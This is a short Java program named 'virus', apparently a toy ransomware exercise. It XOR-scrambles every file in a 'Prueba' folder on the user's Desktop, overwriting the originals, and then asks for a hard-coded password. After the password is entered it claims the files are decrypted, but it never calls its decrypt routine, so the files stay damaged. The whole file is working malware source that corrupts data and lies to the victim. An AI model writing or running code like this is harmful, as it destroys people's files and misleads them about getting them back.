import javax.swing.*;
import java.io.*;
import java.text.ParseException;


public class virus {

    public static void recogerArchivos() throws IOException {
        String a = System.getProperty("user.name");
        String cadena = "C:\\Users\\"+a+"\\Desktop\\Prueba\\";
        File carpeta = new File("C:\\Users\\"+a+"\\Desktop\\Prueba");
        for (File archivo: carpeta.listFiles()){
            if(!archivo.isDirectory()) {
                    encriptar(cadena+archivo.getName());
                }
            }
    }

    public static void encriptar(String archivo) throws IOException {
        int key = 8080912;
        FileInputStream fis = new FileInputStream(archivo);
        byte data[] = new byte[fis.available()];
        fis.read(data);
        int i = 0;
        for (byte b : data){
            data[i] = (byte)(b ^ key);
            i++;
        }

        FileOutputStream fos = new FileOutputStream(archivo);
        fos.write(data);
        fos.close();
        fis.close();

    }

    public static void desencriptar(String archivo) throws IOException {
        int key = 8080912;
        FileInputStream fis = new FileInputStream(archivo);
        byte data[] = new byte[fis.available()];
        fis.read(data);
        int i = 0;
        for (byte b : data){
            data[i] = (byte)(b ^ key);
            i++;
        }

        FileOutputStream fos = new FileOutputStream(archivo);
        fos.write(data);
        fos.close();
        fis.close();
    }

    public static void  vistas() throws IOException {
        int v = 0;
        String contra = "";
        do {
            contra = JOptionPane.showInputDialog("Ingrese la clave Correcta");

            if (contra.equals("nambechele") ) {
                JOptionPane.showMessageDialog(null, "Archivo desencriptado correctamente");
                v = 1;
            } else{
                JOptionPane.showMessageDialog(null, "Ingrese la clave correcta");
                v = 2;
            }
        } while (v == 2);

    }

    public static void main(String[] args) throws ParseException, IOException {
        recogerArchivos();
        vistas();
    }



}


